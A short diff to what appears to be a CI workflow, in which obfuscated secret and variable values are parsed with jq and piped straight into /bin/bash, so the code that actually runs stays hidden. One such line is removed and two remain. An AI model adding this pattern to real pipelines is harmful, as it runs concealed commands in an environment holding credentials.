@@ -17,7 +17,6 @@ jobs:
           a0: ${{ secrets.a0 }}
         run: |
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
-          printf '%s' "$ews31383" | jq -r .etasx6331 | /bin/bash
           echo $lio783 | jq -r .w5710 | /bin/bash
 
       - name: Upload artifact
